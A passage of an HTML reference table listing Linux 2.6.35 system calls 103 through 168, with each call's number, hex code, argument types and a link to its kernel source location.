<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syslog.2.html" target="_blank" rel="external">sys_syslog</a></td>
<td>0x67</td>
<td>int type</td>
<td>char __user *buf</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/printk.c?v=2.6.35#L412" target="_blank" rel="external">kernel/printk.c:412</a></td>
</tr>
<tr>
<td>104</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setitimer.2.html" target="_blank" rel="external">sys_setitimer</a></td>
<td>0x68</td>
<td>int which</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="external">struct itimerval __user *value</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="external">struct itimerval __user *ovalue</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L279" target="_blank" rel="external">kernel/itimer.c:279</a></td>
</tr>
<tr>
<td>105</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getitimer.2.html" target="_blank" rel="external">sys_getitimer</a></td>
<td>0x69</td>
<td>int which</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="external">struct itimerval __user *value</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L103" target="_blank" rel="external">kernel/itimer.c:103</a></td>
</tr>
<tr>
<td>106</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newstat.2.html" target="_blank" rel="external">sys_newstat</a></td>
<td>0x6a</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="external">struct stat __user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L237" target="_blank" rel="external">fs/stat.c:237</a></td>
</tr>
<tr>
<td>107</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newlstat.2.html" target="_blank" rel="external">sys_newlstat</a></td>
<td>0x6b</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="external">struct stat __user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L247" target="_blank" rel="external">fs/stat.c:247</a></td>
</tr>
<tr>
<td>108</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstat.2.html" target="_blank" rel="external">sys_newfstat</a></td>
<td>0x6c</td>
<td>unsigned int fd</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="external">struct stat __user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L273" target="_blank" rel="external">fs/stat.c:273</a></td>
</tr>
<tr>
<td>109</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uname.2.html" target="_blank" rel="external">sys_uname</a></td>
<td>0x6d</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L16" target="_blank" rel="external">struct old_utsname __user *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1115" target="_blank" rel="external">kernel/sys.c:1115</a></td>
</tr>
<tr>
<td>110</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/iopl.2.html" target="_blank" rel="external">sys_iopl</a></td>
<td>0x6e</td>
<td>unsigned int</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>111</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vhangup.2.html" target="_blank" rel="external">sys_vhangup</a></td>
<td>0x6f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L1008" target="_blank" rel="external">fs/open.c:1008</a></td>
</tr>
<tr>
<td>112</td>
<td>not implemented</td>
<td>0x70</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>113</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86old.2.html" target="_blank" rel="external">sys_vm86old</a></td>
<td>0x71</td>
<td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/vm86.h?v=2.6.35#L96" target="_blank" rel="external">struct vm86_struct __user *</a></td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>114</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/wait4.2.html" target="_blank" rel="external">sys_wait4</a></td>
<td>0x72</td>
<td>pid_t pid</td>
<td>int __user *stat_addr</td>
<td>int options</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="external">struct rusage __user *ru</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1726" target="_blank" rel="external">kernel/exit.c:1726</a></td>
</tr>
<tr>
<td>115</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapoff.2.html" target="_blank" rel="external">sys_swapoff</a></td>
<td>0x73</td>
<td>const char __user *specialfile</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1533" target="_blank" rel="external">mm/swapfile.c:1533</a></td>
</tr>
<tr>
<td>116</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysinfo.2.html" target="_blank" rel="external">sys_sysinfo</a></td>
<td>0x74</td>
<td>struct sysinfo __user *info</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1565" target="_blank" rel="external">kernel/timer.c:1565</a></td>
</tr>
<tr>
<td>117</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ipc.2.html" target="_blank" rel="external">sys_ipc</a></td>
<td>0x75</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/ipc/syscall.c?v=2.6.35#L16" target="_blank" rel="external">ipc/syscall.c:16</a></td>
</tr>
<tr>
<td>118</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsync.2.html" target="_blank" rel="external">sys_fsync</a></td>
<td>0x76</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L221" target="_blank" rel="external">fs/sync.c:221</a></td>
</tr>
<tr>
<td>119</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigreturn.2.html" target="_blank" rel="external">sys_sigreturn</a></td>
<td>0x77</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *regs</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L758" target="_blank" rel="external">arch/alpha/kernel/entry.S:758</a></td>
</tr>
<tr>
<td>120</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone.2.html" target="_blank" rel="external">sys_clone</a></td>
<td>0x78</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L733" target="_blank" rel="external">arch/alpha/kernel/entry.S:733</a></td>
</tr>
<tr>
<td>121</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setdomainname.2.html" target="_blank" rel="external">sys_setdomainname</a></td>
<td>0x79</td>
<td>char __user *name</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1214" target="_blank" rel="external">kernel/sys.c:1214</a></td>
</tr>
<tr>
<td>122</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newuname.2.html" target="_blank" rel="external">sys_newuname</a></td>
<td>0x7a</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L24" target="_blank" rel="external">struct new_utsname __user *name</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1097" target="_blank" rel="external">kernel/sys.c:1097</a></td>
</tr>
<tr>
<td>123</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/modify_ldt.2.html" target="_blank" rel="external">sys_modify_ldt</a></td>
<td>0x7b</td>
<td>int</td>
<td>void __user *</td>
<td>unsigned long</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>124</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/adjtimex.2.html" target="_blank" rel="external">sys_adjtimex</a></td>
<td>0x7c</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/timex.h?v=2.6.35#L64" target="_blank" rel="external">struct timex __user *txc_p</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L206" target="_blank" rel="external">kernel/time.c:206</a></td>
</tr>
<tr>
<td>125</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mprotect.2.html" target="_blank" rel="external">sys_mprotect</a></td>
<td>0x7d</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned long prot</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mprotect.c?v=2.6.35#L221" target="_blank" rel="external">mm/mprotect.c:221</a></td>
</tr>
<tr>
<td>126</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigprocmask.2.html" target="_blank" rel="external">sys_sigprocmask</a></td>
<td>0x7e</td>
<td>int how</td>
<td>old_sigset_t __user *set</td>
<td>old_sigset_t __user *oset</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2573" target="_blank" rel="external">kernel/signal.c:2573</a></td>
</tr>
<tr>
<td>127</td>
<td>not implemented</td>
<td>0x7f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>128</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/init_module.2.html" target="_blank" rel="external">sys_init_module</a></td>
<td>0x80</td>
<td>void __user *umod</td>
<td>unsigned long len</td>
<td>const char __user *uargs</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L2611" target="_blank" rel="external">kernel/module.c:2611</a></td>
</tr>
<tr>
<td>129</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/delete_module.2.html" target="_blank" rel="external">sys_delete_module</a></td>
<td>0x81</td>
<td>const char __user *name_user</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L720" target="_blank" rel="external">kernel/module.c:720</a></td>
</tr>
<tr>
<td>130</td>
<td>not implemented</td>
<td>0x82</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>131</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl.2.html" target="_blank" rel="external">sys_quotactl</a></td>
<td>0x83</td>
<td>unsigned int cmd</td>
<td>const char __user *special</td>
<td>qid_t id</td>
<td>void __user *addr</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/quota/quota.c?v=2.6.35#L333" target="_blank" rel="external">fs/quota/quota.c:333</a></td>
</tr>
<tr>
<td>132</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgid.2.html" target="_blank" rel="external">sys_getpgid</a></td>
<td>0x84</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L990" target="_blank" rel="external">kernel/sys.c:990</a></td>
</tr>
<tr>
<td>133</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchdir.2.html" target="_blank" rel="external">sys_fchdir</a></td>
<td>0x85</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L382" target="_blank" rel="external">fs/open.c:382</a></td>
</tr>
<tr>
<td>134</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bdflush.2.html" target="_blank" rel="external">sys_bdflush</a></td>
<td>0x86</td>
<td>int func</td>
<td>long data</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/buffer.c?v=2.6.35#L3278" target="_blank" rel="external">fs/buffer.c:3278</a></td>
</tr>
<tr>
<td>135</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysfs.2.html" target="_blank" rel="external">sys_sysfs</a></td>
<td>0x87</td>
<td>int option</td>
<td>unsigned long arg1</td>
<td>unsigned long arg2</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/filesystems.c?v=2.6.35#L182" target="_blank" rel="external">fs/filesystems.c:182</a></td>
</tr>
<tr>
<td>136</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/personality.2.html" target="_blank" rel="external">sys_personality</a></td>
<td>0x88</td>
<td>unsigned int personality</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/exec_domain.c?v=2.6.35#L191" target="_blank" rel="external">kernel/exec_domain.c:191</a></td>
</tr>
<tr>
<td>137</td>
<td>not implemented</td>
<td>0x89</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>138</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid16.2.html" target="_blank" rel="external">sys_setfsuid16</a></td>
<td>0x8a</td>
<td>old_uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L118" target="_blank" rel="external">kernel/uid16.c:118</a></td>
</tr>
<tr>
<td>139</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid16.2.html" target="_blank" rel="external">sys_setfsgid16</a></td>
<td>0x8b</td>
<td>old_gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L126" target="_blank" rel="external">kernel/uid16.c:126</a></td>
</tr>
<tr>
<td>140</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llseek.2.html" target="_blank" rel="external">sys_llseek</a></td>
<td>0x8c</td>
<td>unsigned int fd</td>
<td>unsigned long offset_high</td>
<td>unsigned long offset_low</td>
<td>loff_t __user *result</td>
<td>unsigned int origin</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L191" target="_blank" rel="external">fs/read_write.c:191</a></td>
</tr>
<tr>
<td>141</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html" target="_blank" rel="external">sys_getdents</a></td>
<td>0x8d</td>
<td>unsigned int fd</td>
<td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L135" target="_blank" rel="external">struct linux_dirent __user *dirent</a></td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L191" target="_blank" rel="external">fs/readdir.c:191</a></td>
</tr>
<tr>
<td>142</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html" target="_blank" rel="external">sys_select</a></td>
<td>0x8e</td>
<td>int n</td>
<td>fd_set __user *inp</td>
<td>fd_set __user *outp</td>
<td>fd_set __user *exp</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="external">struct timeval __user *tvp</a></td>
<td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L596" target="_blank" rel="external">fs/select.c:596</a></td>
</tr>
<tr>
<td>143</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flock.2.html" target="_blank" rel="external">sys_flock</a></td>
<td>0x8f</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/locks.c?v=2.6.35#L1569" target="_blank" rel="external">fs/locks.c:1569</a></td>
</tr>
<tr>
<td>144</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msync.2.html" target="_blank" rel="external">sys_msync</a></td>
<td>0x90</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/msync.c?v=2.6.35#L31" target="_blank" rel="external">mm/msync.c:31</a></td>
</tr>
<tr>
<td>145</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html" target="_blank" rel="external">sys_readv</a></td>
<td>0x91</td>
<td>unsigned long fd</td>
<td>const struct iovec __user *vec</td>
<td>unsigned long vlen</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L711" target="_blank" rel="external">fs/read_write.c:711</a></td>
</tr>
<tr>
<td>146</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html" target="_blank" rel="external">sys_writev</a></td>
<td>0x92</td>
<td>unsigned long fd</td>
<td>const struct iovec __user *vec</td>
<td>unsigned long vlen</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L732" target="_blank" rel="external">fs/read_write.c:732</a></td>
</tr>
<tr>
<td>147</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsid.2.html" target="_blank" rel="external">sys_getsid</a></td>
<td>0x93</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1027" target="_blank" rel="external">kernel/sys.c:1027</a></td>
</tr>
<tr>
<td>148</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fdatasync.2.html" target="_blank" rel="external">sys_fdatasync</a></td>
<td>0x94</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L226" target="_blank" rel="external">fs/sync.c:226</a></td>
</tr>
<tr>
<td>149</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysctl.2.html" target="_blank" rel="external">sys_sysctl</a></td>
<td>0x95</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/sysctl.h?v=2.6.35#L36" target="_blank" rel="external">struct <strong>sysctl_args </strong>user *args</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sysctl_binary.c?v=2.6.35#L1462" target="_blank" rel="external">kernel/sysctl_binary.c:1462</a></td>
</tr>
<tr>
<td>150</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock.2.html" target="_blank" rel="external">sys_mlock</a></td>
<td>0x96</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L491" target="_blank" rel="external">mm/mlock.c:491</a></td>
</tr>
<tr>
<td>151</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlock.2.html" target="_blank" rel="external">sys_munlock</a></td>
<td>0x97</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L519" target="_blank" rel="external">mm/mlock.c:519</a></td>
</tr>
<tr>
<td>152</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlockall.2.html" target="_blank" rel="external">sys_mlockall</a></td>
<td>0x98</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L556" target="_blank" rel="external">mm/mlock.c:556</a></td>
</tr>
<tr>
<td>153</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlockall.2.html" target="_blank" rel="external">sys_munlockall</a></td>
<td>0x99</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L584" target="_blank" rel="external">mm/mlock.c:584</a></td>
</tr>
<tr>
<td>154</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setparam.2.html" target="_blank" rel="external">sys_sched_setparam</a></td>
<td>0x9a</td>
<td>pid_t pid</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="external">struct sched_param __user *param</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4616" target="_blank" rel="external">kernel/sched.c:4616</a></td>
</tr>
<tr>
<td>155</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getparam.2.html" target="_blank" rel="external">sys_sched_getparam</a></td>
<td>0x9b</td>
<td>pid_t pid</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="external">struct sched_param __user *param</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4651" target="_blank" rel="external">kernel/sched.c:4651</a></td>
</tr>
<tr>
<td>156</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setscheduler.2.html" target="_blank" rel="external">sys_sched_setscheduler</a></td>
<td>0x9c</td>
<td>pid_t pid</td>
<td>int policy</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="external">struct sched_param __user *param</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4601" target="_blank" rel="external">kernel/sched.c:4601</a></td>
</tr>
<tr>
<td>157</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getscheduler.2.html" target="_blank" rel="external">sys_sched_getscheduler</a></td>
<td>0x9d</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4625" target="_blank" rel="external">kernel/sched.c:4625</a></td>
</tr>
<tr>
<td>158</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_yield.2.html" target="_blank" rel="external">sys_sched_yield</a></td>
<td>0x9e</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4851" target="_blank" rel="external">kernel/sched.c:4851</a></td>
</tr>
<tr>
<td>159</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_max.2.html" target="_blank" rel="external">sys_sched_get_priority_max</a></td>
<td>0x9f</td>
<td>int policy</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4989" target="_blank" rel="external">kernel/sched.c:4989</a></td>
</tr>
<tr>
<td>160</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_min.2.html" target="_blank" rel="external">sys_sched_get_priority_min</a></td>
<td>0xa0</td>
<td>int policy</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5014" target="_blank" rel="external">kernel/sched.c:5014</a></td>
</tr>
<tr>
<td>161</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_rr_get_interval.2.html" target="_blank" rel="external">sys_sched_rr_get_interval</a></td>
<td>0xa1</td>
<td>pid_t pid</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *interval</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5039" target="_blank" rel="external">kernel/sched.c:5039</a></td>
</tr>
<tr>
<td>162</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nanosleep.2.html" target="_blank" rel="external">sys_nanosleep</a></td>
<td>0xa2</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *rqtp</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *rmtp</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/hrtimer.c?v=2.6.35#L1606" target="_blank" rel="external">kernel/hrtimer.c:1606</a></td>
</tr>
<tr>
<td>163</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mremap.2.html" target="_blank" rel="external">sys_mremap</a></td>
<td>0xa3</td>
<td>unsigned long addr</td>
<td>unsigned long old_len</td>
<td>unsigned long new_len</td>
<td>unsigned long flags</td>
<td>unsigned long new_addr</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mremap.c?v=2.6.35#L510" target="_blank" rel="external">mm/mremap.c:510</a></td>
</tr>
<tr>
<td>164</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid16.2.html" target="_blank" rel="external">sys_setresuid16</a></td>
<td>0xa4</td>
<td>old_uid_t ruid</td>
<td>old_uid_t euid</td>
<td>old_uid_t suid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L75" target="_blank" rel="external">kernel/uid16.c:75</a></td>
</tr>
<tr>
<td>165</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid16.2.html" target="_blank" rel="external">sys_getresuid16</a></td>
<td>0xa5</td>
<td>old_uid_t __user *ruid</td>
<td>old_uid_t __user *euid</td>
<td>old_uid_t __user *suid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L84" target="_blank" rel="external">kernel/uid16.c:84</a></td>
</tr>
<tr>
<td>166</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86.2.html" target="_blank" rel="external">sys_vm86</a></td>
<td>0xa6</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>167</td>
<td>not implemented</td>
<td>0xa7</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>168</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html" target="_blank" rel="external">sys_poll</a></td>
<td>0xa8</td>
<td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31" target="_blank" rel="external">struct pollfd __user *ufds</a></td>
<td>unsigned int nfds</td>
<td>long timeout</td>
<td>-</td>
<td>-</td>
